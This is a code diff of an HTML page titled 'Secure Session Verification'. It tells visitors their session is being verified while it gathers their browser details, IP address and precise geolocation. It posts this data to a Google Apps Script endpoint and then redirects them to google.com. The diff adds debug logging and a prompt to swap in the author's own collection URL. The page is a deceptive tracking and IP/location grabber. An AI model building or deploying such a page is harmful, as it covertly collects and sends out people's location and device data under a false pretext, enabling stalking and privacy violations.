@@ -3,56 +3,133 @@
 <head>
   <title>Secure Session Verification</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; }
+    .debug { background: #f0f0f0; padding: 10px; margin: 10px 0; border-radius: 5px; font-size: 12px; }
+  </style>
 </head>
 <body>
   <h3>Please wait while we verify your session...</h3>
-
+  <div id="status">Collecting information...</div>
+  <div id="debug" class="debug"></div>
+  
   <script>
+    const debugDiv = document.getElementById('debug');
+    const statusDiv = document.getElementById('status');
+    
+    function addDebug(message) {
+      debugDiv.innerHTML += message + '<br>';
+      console.log(message);
+    }
+    
+    function updateStatus(message) {
+      statusDiv.innerHTML = message;
+      addDebug('STATUS: ' + message);
+    }
+    
     const data = {
       userAgent: navigator.userAgent,
       platform: navigator.platform,
       screenWidth: screen.width,
       screenHeight: screen.height,
-      referrer: document.referrer
+      referrer: document.referrer,
+      timestamp: new Date().toISOString()
     };
-
+    
+    addDebug('Starting data collection...');
+    addDebug('Screen: ' + data.screenWidth + 'x' + data.screenHeight);
+    addDebug('Platform: ' + data.platform);
+    addDebug('User Agent: ' + data.userAgent.substring(0, 50) + '...');
+    
     // Step 1: Get IP
+    updateStatus('Getting IP address...');
     fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(ipData => {
         data.ip = ipData.ip;
-
+        addDebug('IP obtained: ' + data.ip);
+        
         // Step 2: Get location
-        navigator.geolocation.getCurrentPosition(
-          function (pos) {
-            data.latitude = pos.coords.latitude;
-            data.longitude = pos.coords.longitude;
-            data.accuracy = pos.coords.accuracy;
-            sendData();
-          },
-          function (err) {
-            sendData(); // Skip location if blocked
-          }
-        );
+        updateStatus('Getting location...');
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            function (pos) {
+              data.latitude = pos.coords.latitude;
+              data.longitude = pos.coords.longitude;
+              data.accuracy = pos.coords.accuracy;
+              addDebug('Location: ' + data.latitude + ', ' + data.longitude + ' (±' + data.accuracy + 'm)');
+              sendData();
+            },
+            function (err) {
+              addDebug('Location error: ' + err.message);
+              addDebug('Continuing without location...');
+              sendData();
+            },
+            {
+              timeout: 10000,
+              enableHighAccuracy: true
+            }
+          );
+        } else {
+          addDebug('Geolocation not supported');
+          sendData();
+        }
+      })
+      .catch(err => {
+        addDebug('IP fetch error: ' + err.message);
+        sendData();
       });
-
+    
     function sendData() {
+      updateStatus('Sending data to server...');
+      
+      // Show what we're sending
+      addDebug('=== DATA BEING SENT ===');
+      for (let key in data) {
+        if (data[key] !== undefined && data[key] !== null) {
+          addDebug(key + ': ' + data[key]);
+        }
+      }
+      addDebug('=======================');
+      
       const formData = new URLSearchParams();
       for (let key in data) {
-        formData.append(key, data[key]);
+        if (data[key] !== undefined && data[key] !== null) {
+          formData.append(key, data[key]);
+        }
       }
-
-      // Use no-cors to avoid preflight and CORS issues
-      fetch("https://script.google.com/macros/s/AKfycbwYndUfgsQIqSSZedH-y9GZCaBSMEg7eVNxxUrHz1S3f4MvNN_PUW-nYwochdNX9NSX/exec", {
+      
+      addDebug('FormData string: ' + formData.toString());
+      
+      // **REPLACE THIS URL WITH YOUR NEW DEPLOYMENT URL**
+      const scriptUrl = "https://script.google.com/macros/s/AKfycbwYndUfgsQIqSSZedH-y9GZCaBSMEg7eVNxxUrHz1S3f4MvNN_PUW-nYwochdNX9NSX/exec";
+      
+      addDebug('Sending POST request to: ' + scriptUrl);
+      
+      fetch(scriptUrl, {
         method: "POST",
         body: formData,
         mode: "no-cors"
+      })
+      .then(() => {
+        addDebug('✅ Request sent successfully');
+        updateStatus('✅ Session verified. Check Google Sheet!');
+        
+        // Don't redirect immediately so you can see the debug info
+        setTimeout(() => {
+          addDebug('Redirecting to Google...');
+          window.location.href = "https://www.google.com";
+        }, 5000); // 5 seconds to read debug info
+      })
+      .catch(err => {
+        addDebug('❌ Fetch error: ' + err.message);
+        updateStatus('❌ Verification failed');
+        
+        // Still redirect after error
+        setTimeout(() => {
+          window.location.href = "https://www.google.com";
+        }, 5000);
       });
-
-      document.body.innerHTML = "<h3>✅ Session verified. Redirecting...</h3>";
-      setTimeout(() => {
-        window.location.href = "https://www.google.com";
-      }, 2000);
     }
   </script>
 </body>
